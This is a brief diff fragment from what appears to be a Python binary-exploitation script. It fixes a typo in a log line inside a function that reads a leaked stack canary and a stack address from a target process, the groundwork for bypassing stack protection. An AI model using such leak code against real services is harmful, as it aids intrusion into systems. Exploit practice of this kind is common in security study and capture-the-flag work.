@@ -64,7 +64,7 @@ def leak_canary(p):
     p.recvline()
 
     canary = p.recv(7).rjust(8,b"\x00")
-    log.info(f"Received Canary Leak: {canary)}")
+    log.info(f"Received Canary Leak: {canary}")
     
     stack_leak = u64(p.recv(6).ljust(8,b"\x00"))
     log.info(f"Stack Leak {hex(stack_leak)}")
